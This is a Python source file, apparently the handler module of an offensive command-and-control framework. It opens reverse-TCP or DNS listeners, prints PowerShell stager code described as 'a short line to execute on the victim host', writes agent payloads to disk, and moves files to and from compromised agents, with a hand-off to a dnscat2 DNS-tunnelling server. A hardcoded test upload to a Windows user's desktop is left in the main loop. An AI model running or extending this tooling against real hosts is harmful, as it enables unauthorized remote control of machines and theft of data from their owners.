#!/usr/bin/python3
import os
import threading

import time

from syhandler.message.channel import Channel
from syhelpers.files import sanatizefilename
from syhelpers.sythread import SyThread
from .transport.dns import TransportDns
from .transport.reversetcp import TransportReverseTcp
from .message.message import Message, MessageDownloadRequest, MessageUploadRequest
from syplatform.powershell.powershell import PlatformPowershell
from syhelpers.log import *
from syhelpers.modulebase import ModuleBase

DEBUG_MODULE = "Handler"


class Handler(ModuleBase):
    """ Base handler for all interactions with agents """

    # maximal possible channel id = MAXUINT16
    MAX_CHANNELID = 32768

    # noinspection PyMissingConstructor
    def __init__(self):
        """
        Initialize base handler
        """

        self.options = {
            'TRANSPORT': {
                'Description'   :   'Communication way between agent and handler',
                'Required'      :   True,
                'Value'         :   "REVERSETCP",
                'Options'       :   ("REVERSETCP", "DNS")
            },
            'CHANNELENCRYPTION' : {
                'Description'   :   'Encryption Protocol in the transport',
                'Required'      :   True,
                'Value'         :   "TLS",
                'Options'       :   ("NONE", "TLS")
            },
            'PLATFORM' : {
                'Description'   :   'Platform of agent code',
                'Required'      :   True,
                'Value'         :   "POWERSHELL",
                'Options'       :   ("POWERSHELL",)
            }
        }
        self.transport = TransportReverseTcp(self)
        #TODO: CHANNELENCRYPTION?
        self.platform = PlatformPowershell(self)
        self.channels = {}
        self.runningthreads = []
        self.receiveheadersthread = None
    
    def setoption(self, name, value):
        """
        set an option for the handler or any of transport and platform modules currently selected
        It tries all of these modules in that order and uses the first success.
        """
        
        if ModuleBase.setoption(self, name, value):
            #print_debug(DEBUG_MODULE, "set {} = {}".format(name, value))
            if str(name).upper() == "TRANSPORT":
                if str(value).upper() == "REVERSETCP":
                    print_debug(DEBUG_MODULE, "changing TRANSPORT to REVERSETCP")
                    self.transport = TransportReverseTcp(self)
                elif str(value).upper() == "DNS":
                    print_debug(DEBUG_MODULE, "changing TRANSPORT to DNS")
                    self.transport = TransportDns(self)
            if str(name).upper() == "PLATFORM":
                if str(value).upper() == "POWERSHELL":
                    print_debug(DEBUG_MODULE, "changing PLATFORM to POWERSHELL")
                    self.platform = PlatformPowershell(self)
            return True
        elif self.transport and self.transport.setoption(name, value):
            return True
        elif self.platform and self.platform.setoption(name, value):
            return True
        else:
            print_error(str(name.upper())+" not recognized as an option")
            return False

    def validate_options(self):
        """
        validate the options for the handler, the selected transport and platform modules
        The validation succeeds only if all of these modules can be validated.
        """

        return ModuleBase.validate_options(self) and self.transport.validate_options() and \
            self.platform.validate_options()

    def generatestager(self):
        """
        generate and print a stager for the current platform / transport
        This method can be used to show a short line to execute on the victim host.
        """

        if not self.validate_options():
            return
        
        stager = self.platform.getstager()
        if stager:
            print_message("Use the following stager code:")
            print_text(stager)
        else:
            print_error("Failed to generate stager code")

    def generateagent(self, filename, staged=False):
        """
        generates the agent code and writes it to the file
        :param filename: name of the file to write to
        :param staged: generate the staged form? this one is usually encoded and signed, so you may just want to
            go with the default of False
        :return: None
        """

        if not self.validate_options():
            return

        agent = self.platform.getagent(staged=staged)
        if agent:
            file = open(filename, 'wb')
            if file:
                file.write(agent)
                file.close()
                print_message("Wrote agent code to file {}".format(filename))
            else:
                print_error("Could not open file {} for writing".format(filename))
        else:
            print_error("Failed to generate agent code")

    def run(self):
        """
        Run the listener and handle any communication with agents
        If staged, the initial connection will be upgraded to a full agent using 
        plattform / transport modules.
        """

        exiting = False

        if not self.validate_options():
            return

        try:
            self.transport.open(staged=self.platform.isstaged())

            # if staging is active, provide stager when first conntact
            if self.platform.isstaged():
                agent = self.platform.getagent()
                print_message("Sending staged agent ({} bytes)...".format(len(agent)))
                self.transport.send(agent)
                self.transport.upgradefromstager()
                print_message("Staging done")

            # special case handling for our hacked DNSCAT2WRAPPER
            if self.platform.options['AGENTTYPE']['Value'] != "DNSCAT2" and \
                            self.platform.options['AGENTTYPE']['Value'] != "DNSCAT2DOWNLOADER":

                # if channel encryption, now is the time!
                if self.options['CHANNELENCRYPTION']['Value'] == "TLS":
                    self.transport.upgradetotls()

                self.channels[Message.CHANNEL_COMMAND] = Channel()
                self.channels[Message.CHANNEL_COMMAND].setOpen()

                # send a hello request to the agent
                message0 = Message(Message.TYPE_MESSAGE, Message.CHANNEL_COMMAND, b'Hello from Handler')
                self.transport.sendmessage(message0)

                # receive a hello request from the agent
                #message1 = self.transport.receivemessage()
                #self.handleMessage(message1)

                #thread = self.download("c:\\Users\\fsteglich\\Desktop\\test2.ps1", "/tmp/a")
                thread = self.upload("/tmp/a", "c:\\Users\\fsteglich\\Desktop\\a.txt")
                self.runningthreads.append(thread)
                #thread.join()

                self._receiveheader_async_start()

                while self.channels[Message.CHANNEL_COMMAND].isOpen():

                    while self._receiveheader_async_isdone():
                        headers = self._receiveheader_async_getresult()
                        if headers is None:
                            self.channels[Message.CHANNEL_COMMAND].setClose()
                            break
                        nextmessage = self.transport.receivemessage(headers=headers)
                        self.handleMessage(nextmessage)
                        self._receiveheader_async_start()

                    if not self.channels[Message.CHANNEL_COMMAND].isOpen():
                        break

                    # collect a list of channels that can be removed
                    channelstoremove = []

                    # for each channel, send its data to the agent
                    for channelid in self.channels.keys():
                        if channelid == Message.CHANNEL_COMMAND:
                            continue
                        if self.channels[channelid].has_data_to_send():
                            data = self.channels[channelid].readToSend(Message.MAX_DATA_LEN)
                            msg = Message(Message.TYPE_DATA, channelid, data)
                            self.transport.sendmessage(msg)
                        elif self.channels[channelid].isClosed():
                            msg = Message(Message.TYPE_EOC, channelid, b"EOC")
                            self.transport.sendmessage(msg)
                            channelstoremove.append(channelid)

                    # remove channels
                    for channelid in channelstoremove:
                        del self.channels[channelid]

                exiting = True

        except KeyboardInterrupt:
            print_error("User interrupt, exiting...")
            exiting = True

        finally:
            self.stop()

        # special case handling for our hacked DNSCAT2WRAPPER
        if (self.platform.options['AGENTTYPE']['Value'] == "DNSCAT2" or
                    self.platform.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER") and not exiting:
            print_message("Starting dnscat2 to handle the real connection")
            zone = self.transport.options['ZONE']['Value'].rstrip(".")
            secret = self.platform.fingerprint
            print_debug(DEBUG_MODULE, "zone = {}, secret = {}".format(zone, secret))

            ruby = "/usr/bin/ruby"
            scriptpath = sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2/server/dnscat2.rb")
            os.execv(ruby, [ruby, scriptpath, "--no-cache", "--secret", secret, zone])

    def _receiveheader_async_start(self):
        """
        tries to receive the header of a message in the transport channel asyncronly
        :return: None
        """

        def receiveheader(transport):
            #print_debug(DEBUG_MODULE, "started async receive of message header")
            buf = b''
            thread = threading.currentThread()
            while len(buf) < Message.HEADER_LEN and not thread.stopevent.isSet():
                morebuf = transport.receive(leng=Message.HEADER_LEN-len(buf))
                #print_debug(DEBUG_MODULE, "async receive of message header read {} bytes".format(len(morebuf)))
                if not morebuf:
                    break
                buf += morebuf
            if thread.stopevent.isSet() or len(buf) < Message.HEADER_LEN:
                print_error("receiving message header stoped or failed")
                buf = None
            thread.result = buf
            #print_debug(DEBUG_MODULE, "async receive of message header done")

        self.receiveheadersthread = SyThread(target=receiveheader, args=(self.transport,))
        self.receiveheadersthread.start()

        return None

    def _receiveheader_async_isdone(self):
        """
        tests whether the thread finished
        :return: True if done
        """

        #print_debug(DEBUG_MODULE, "async receive of message header is_alive: {}"
        #            .format(self.receiveheadersthread.is_alive()))
        return not self.receiveheadersthread.is_alive()

    def _receiveheader_async_getresult(self):
        """
        returns the result from the thread
        :return: result header bytes
        """

        res = self.receiveheadersthread.getResult()
        return res

    def handleMessage(self, message):
        """
        handle the content of a received message
        :param message: message to handle
        :return: True iff handled successfully
        """

        if message is None:
            print_error("Invalid empty message")
            return False

        if message.channelnumber == Message.CHANNEL_COMMAND:
            if message.type == Message.TYPE_COMMAND:
                # TODO: implement command messages
                return False
            elif message.type == Message.TYPE_MESSAGE:
                print_message("AGENT: {}".format(message.content.decode('utf-8')))
                return True
            elif message.type == Message.TYPE_ERRORMESSAGE:
                print_error("AGENT: {}".format(message.content.decode('utf-8')))
                return True
            elif message.type == Message.TYPE_EOC:
                print_error("Connection closed by agent")
                self.channels[Message.CHANNEL_COMMAND].setClose()
                return True
            else:
                # TODO: implement further commands
                print_error("message with invalid type received: {}".format(message.type))
                return False
        else:
            if message.channelnumber not in self.channels and message.type == Message.TYPE_EOC:
                print_debug(DEBUG_MODULE, "received delayed EOC message for unknown channel {}, ignoring"
                            .format(message.channelnumber))
                return True
            elif message.channelnumber not in self.channels:
                print_error("message with channel number {} received, but channel is unknown, dropping"
                            .format(message.channelnumber))
                return False
            elif self.channels[message.channelnumber].isReserved():
                self.channels[message.channelnumber].setOpen()
            elif self.channels[message.channelnumber].isClosed():
                self.transport.sendmessage(Message(Message.TYPE_EOC, message.channelnumber, b'EOC'))
                return False

            if message.type == Message.TYPE_DATA:
                self.channels[message.channelnumber].writeFromSend(message.content)
            elif message.type == Message.TYPE_EOC:
                self.channels[message.channelnumber].setClose()
            else:
                print_error("received invalid type for channel: {}".format(message.type))

            # TODO: implement further channels functions
            return False

    def _reservefreechannelid(self):
        """
        returns the next free channel id and reserves it for a channel
        :return: id or None if not successfull
        """

        for i in range(1, Handler.MAX_CHANNELID):
            if i not in self.channels:
                self.channels[i] = Channel()
                return i

        return None

    def download(self, remotefilename, localfilename):
        """
        should download the remote file and write the content to the local file
        :param remotefilename: string of the remote file to download
        :param localfilename: string of the local file to write
        :return: thread for the download storing
        """

        channelid = self._reservefreechannelid()
        if not channelid:
            print_error("could not reserve a channel id for the download")
            return None

        file = open(localfilename, 'wb')
        if not file:
            print_error("could not open local file {} for writing".format(localfilename))
            return

        # send file download request to agent
        print_message("initiating download of remote file {} to local file {}".format(remotefilename, localfilename))
        downloadrequest = MessageDownloadRequest(remotefilename, downloadchannelid=channelid)
        self.transport.sendmessage(downloadrequest)

        def storefile():
            """
            stores the data from the channel to the file
            :return: None
            """

            storedbytes = 0
            thread = threading.currentThread()

            while not thread.stopevent.isSet():
                while not self.channels[channelid].has_data() and not self.channels[channelid].isClosed() and \
                        not thread.stopevent.isSet():
                    time.sleep(0.1)
                if not self.channels[channelid].has_data() and (self.channels[channelid].isClosed()
                                                                or thread.stopevent.isSet()):
                    break
                print_debug(DEBUG_MODULE, "has_data = {}, isClosed = {}, stopevent = {}"
                            .format(self.channels[channelid].has_data(), self.channels[channelid].isClosed(),
                                    thread.stopevent.isSet()))
                data = self.channels[channelid].read(4096)
                storedbytes += len(data)
                print_debug(DEBUG_MODULE, "read {} bytes from channel {}".format(len(data), channelid))
                file.write(data)

            file.close()
            print_message("wrote {} bytes to file {}".format(storedbytes, localfilename))
            if thread.stopevent.isSet():
                print_error("download stoped, file content may be incomplete")

        downloadthread = SyThread(target=storefile)
        downloadthread.start()

        return downloadthread

    def upload(self, localfilename, remotefilename):
        """
        should upload the local fiele to the agent
        :param localfilename: string of the local file to read
        :param remotefilename: string of the remote file to upload to
        :return: thread for the upload writing storing
        """

        channelid = self._reservefreechannelid()
        if not channelid:
            print_error("could not reserve a channel id for the upload")
            return None

        file = open(localfilename, 'rb')
        if not file:
            print_error("could not open local file {} for reading".format(localfilename))
            return

        # send file upload request to agent
        print_message("initiating upload for local file {} to remote file {}".format(localfilename, remotefilename))
        uploadrequest = MessageUploadRequest(remotefilename, uploadchannelid=channelid)
        self.transport.sendmessage(uploadrequest)

        def upfile():
            """
            pushes the data of the local file to the channel
            :return: None
            """

            storedbytes = 0
            thread = threading.currentThread()
            self.channels[channelid].setOpen()

            while not thread.stopevent.isSet():
                data = file.read(4096)
                if data == b'':
                    break  # End of file
                self.channels[channelid].write(data)
                storedbytes += len(data)
                print_debug(DEBUG_MODULE, "wrote {} bytes to channel {}".format(len(data), channelid))

            self.channels[channelid].setClose()

            file.close()
            print_message("wrote {} bytes from file {} channel {}".format(storedbytes, localfilename, channelid))
            if thread.stopevent.isSet():
                print_error("upload stoped, file content may be incomplete")

        uploadthread = SyThread(target=upfile)
        uploadthread.start()

        return uploadthread

    def stop(self):
        """
        tries to cleanup the handler
        :return: None
        """

        # TODO: send a channel close message to the agent, atm send is blocking => will not end
        #print_debug(DEBUG_MODULE, "Sending EOC message")
        #if Message.CHANNEL_COMMAND in self.channels and self.channels[Message.CHANNEL_COMMAND].isOpen():
        #    msg = Message(Message.TYPE_EOC, Message.CHANNEL_COMMAND, b'EOC')
        #    self.transport.sendmessage(msg)

        # stop all threads
        print_debug(DEBUG_MODULE, "Asking threads to finish")
        if self.receiveheadersthread:
            self.receiveheadersthread.terminate(timeout=1.0)
        for t in self.runningthreads:
            t.terminate(timeout=1.0)

        print_debug(DEBUG_MODULE, "Closing transport module")
        self.transport.close()

        print_debug(DEBUG_MODULE, "stop call done")
